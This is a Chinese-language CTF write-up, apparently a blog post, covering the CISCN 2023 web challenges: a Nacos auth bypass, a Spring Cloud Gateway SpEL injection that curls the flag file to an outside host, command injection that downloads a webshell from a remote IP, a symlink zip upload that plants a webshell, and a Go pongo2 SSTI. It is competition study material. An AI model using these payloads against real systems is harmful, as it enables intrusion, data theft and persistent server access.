@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>CISCN2023初赛 Web WriteUp(含复现) - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="CISCN2023初赛 Web WriteUp(含复现) - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2023/05/30/CISCN2023%E5%88%9D%E8%B5%9B%20Web%20WriteUp(%E5%90%AB%E5%A4%8D%E7%8E%B0)/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-05-30T07:17:16.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/WriteUp/">WriteUp</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>May</span>
+            <span>30,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">CISCN2023初赛 Web WriteUp(含复现)</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h1><p>首先是个nacos,存在权限绕过漏洞，随便输一个账号登录，修改返回包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY2MjM3OTIzOX0.GZbjTD75xkk4FjjDpYLEGcmbbUNw-sUepsn65xiSeU8</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Date: Mon, 05 Sep 2022 07:00:39 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 181</span><br><span class="line">&#123;&quot;accessToken&quot;:&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY2MjM3OTIzOX0.GZbjTD75xkk4FjjDpYLEGcmbbUNw-sUepsn65xiSeU8&quot;,&quot;tokenTtl&quot;:18000,&quot;globalAdmin&quot;:true,&quot;username&quot;:&quot;nacos&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685415848047-f2232f52-79a5-426b-90a0-3d8cac295601.png#averageHue=%23f1f0f0&clientId=u23c7274b-89be-4&from=paste&height=459&id=ue26883ef&originHeight=574&originWidth=847&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=120113&status=done&style=none&taskId=u6a4f32db-c1d1-4594-ab01-ca9ea13ee70&title=&width=677.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685415854446-8a265755-b14a-416e-8b78-3044d6c3e1d4.png#averageHue=%23d7cdb8&clientId=u23c7274b-89be-4&from=paste&height=630&id=ua37ff81b&originHeight=788&originWidth=1784&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=124545&status=done&style=none&taskId=ueb59166e-ac05-4003-972c-7eb9090e22a&title=&width=1427.2" alt="image.png"><br>登入系统<br>然后根据源码发现是springcloud绑定了nacos，查看springcloud版本为3.0.5存在spel注入漏洞,根据文章来复现<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11493#toc-3">https://xz.aliyun.com/t/11493#toc-3</a></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">exam</span></span><br><span class="line">          <span class="attr">order:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://service-provider</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/echo/**</span></span><br><span class="line">          <span class="attr">filters:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">AddResponseHeader</span></span><br><span class="line">              <span class="attr">args:</span></span><br><span class="line">                <span class="attr">name:</span> <span class="string">result</span></span><br><span class="line">                <span class="attr">value:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;id&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>因为给的backend服务里写了配置要以json改，找个在线转换的即可</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;spring&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cloud&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;gateway&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exam&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lb://service-provider&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">              <span class="string">&quot;Path=/echo/**&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">              <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;result&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;curl&#x27;,&#x27;-X&#x27;,&#x27;POST&#x27;,&#x27;-F&#x27;,&#x27;xx=@/flag&#x27;,&#x27;http://xxxxx&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">		</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h1><p>存在一个命令拼贴<br><code>[http://eci-2ze2alj3efo7ucqu86a3.cloudeci1.ichunqiu.com:8888/?db=&amp;table_2_dump=1%0acurl%20http://114.116.119.253:7777%0a](http://eci-2ze2alj3efo7ucqu86a3.cloudeci1.ichunqiu.com:8888/?db=&amp;table_2_dump=1%0acurl%20http://114.116.119.253:7777%0a)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685416002617-235e4f9b-14af-425c-9219-b2263f9141f3.png#averageHue=%23080604&clientId=u23c7274b-89be-4&from=paste&id=u325ca5a1&originHeight=219&originWidth=559&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=14800&status=done&style=none&taskId=u1f8f64e3-3400-4d9f-ac8f-8a96c296c86&title=" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze2alj3efo7ucqu86a3.cloudeci1.ichunqiu.com:8888/?db=&amp;table_2_dump=1%0acurl%20http://114.116.119.253:7777/shell.php%20-o%20./log/shell.php</span><br></pre></td></tr></table></figure>
+<p>进而写入shell。最终env查看flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685416037256-b85fe705-2342-474e-9cb8-2f73b8d5bbb3.png#averageHue=%23aeadac&clientId=u23c7274b-89be-4&from=paste&height=676&id=ucedfa957&originHeight=845&originWidth=1799&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=334114&status=done&style=none&taskId=u8a5240c7-efe4-45c9-a268-88b24ad8d7a&title=&width=1439.2" alt="image.png"></p>
+<h1 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h1><p>拿了个一血<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685416053937-bd85052f-f56d-49d5-881a-0a321a037c09.png#averageHue=%23123177&clientId=u23c7274b-89be-4&from=paste&height=296&id=u635bdc10&originHeight=370&originWidth=751&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=165107&status=done&style=none&taskId=u6e1f62b5-039c-484d-9d84-e9b16cc6a55&title=&width=600.8" alt="image.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//only this!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后就可以很容易的知道这就是一个ln软连接写shell而已了<br>我们再自己的linux中先</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /var/www/html poc</span><br></pre></td></tr></table></figure>
+<p>将网站根目录创建一个软连接<br>然后zip -y shell.zip poc，把这个软连接文件压缩为zip<br>然后在mkdir poc<br>之后再poc文件夹里写一个shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685416077076-8412f780-eb27-4595-b264-415e7eddf8e7.png#averageHue=%23423a31&clientId=u23c7274b-89be-4&from=paste&height=174&id=u480e314b&originHeight=217&originWidth=1775&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=495882&status=done&style=none&taskId=ud486a506-28e7-47c3-b0e0-5da1c9edf5f&title=&width=1420" alt="image.png"><br>最后zip -r poc.zip poc<br>把这个文件夹压缩为一个zip<br>最后我们分别依次上传这2个zip就可以获得webshell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685416092609-120b4834-0534-4347-85b9-4fcfe234c591.png#averageHue=%23b0b0b0&clientId=u23c7274b-89be-4&from=paste&height=686&id=u3d9f536e&originHeight=857&originWidth=1740&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=111746&status=done&style=none&taskId=u4a2907b5-bafc-4b38-86c9-4393979f18d&title=&width=1392" alt="image.png"></p>
+<h1 id="go-session-复现"><a href="#go-session-复现" class="headerlink" title="go_session(复现)"></a>go_session(复现)</h1><p>这一题属于是考虑错了地方。有点小可惜的，距离解出来就差一点点，很可惜的啊，我是准备了备份文件的，这边我就先搭建一下环境</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/flosch/pongo2/v4&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;html&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">		err = session.Save(c.Request, c.Writer)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">	xssWaf := html.EscapeString(name)</span><br><span class="line">	tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">	<span class="comment">//tpl, err := pongo2.FromString(&quot;Hello &quot; + name + &quot;!&quot;)</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>main.go</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">	r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">	r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">	r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>提供了3个路由，其中flask对应的就是后端的flask，他们都是运行在一个系统上的，我们可以通过访问<code>localhost/flask?name=/</code>让他debug报错获取源码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">d = &#123;</span><br><span class="line">    <span class="string">&quot;h&quot;</span>: <span class="string">&quot;hello world!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>当然这是我编的源码，国赛上的也和这个基本一样，没啥影响，然后呢你就可以发现就是一个普通的flask服务，开启了debug，但是我由于经验不足，看到debug默认想到的地方是算pin，忽略了可以文件热部署的情况，因此这是我的失误，导致这一题没拿下了。<br>那么我们的思路就很简单，通过go的ssti去文件覆盖flask的server.py即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685416937726-dd46ee16-c250-4251-b053-241ba8d512aa.png#averageHue=%23232528&clientId=u23c7274b-89be-4&from=paste&height=79&id=u7f8b2016&originHeight=99&originWidth=615&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12297&status=done&style=none&taskId=u6ae22a98-86f5-44c1-b94d-3efa1f1e409&title=&width=492" alt="image.png"><br>我们注意一下这一点，他在tpl.execute的时候是把c也放进去了的，这个c代表着gin里的上下文对象，这样我们就可以引用<code>Context</code>下的所有函数了。但是我对gin框架不是很熟悉，所以没考虑到这一点<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685417004843-428f9da1-1620-48b8-ba77-26c759a6e78c.png#averageHue=%23333231&clientId=u23c7274b-89be-4&from=paste&height=176&id=u77e6fac4&originHeight=220&originWidth=790&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11719&status=done&style=none&taskId=u54470464-7de2-4459-a784-4b94c794c17&title=&width=632" alt="image.png"><br>我们其实是可以通过<code>c.SaveUploadedFile(file, file.Filename)</code><br>的方法，最后的payload是<br><code>&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Header.Accept.0),c.Request.Header.Referer.0)&#125;&#125; </code><br>go源码里有一段waf，会过滤引号，所以我们和flask一样通过request对象可以逃逸，当时就在这里止步了。不知道去覆盖，可惜呀，那现在来实操一下。<br>想要SSTI首先你还得准备key呢，这里很傻逼，key是空的。。。。。所以你只需要本地起一个空key的环境就行了，所以这里就不赘述，接下来是复现步骤<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685417685542-144f5c56-4ff3-45f0-b63a-2dfafc834d1a.png#averageHue=%23fefefe&clientId=u23c7274b-89be-4&from=paste&height=211&id=uccf804e1&originHeight=264&originWidth=983&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6743&status=done&style=none&taskId=u2e20c870-fcac-4a41-9943-23651264175&title=&width=786.4" alt="image.png"></p>
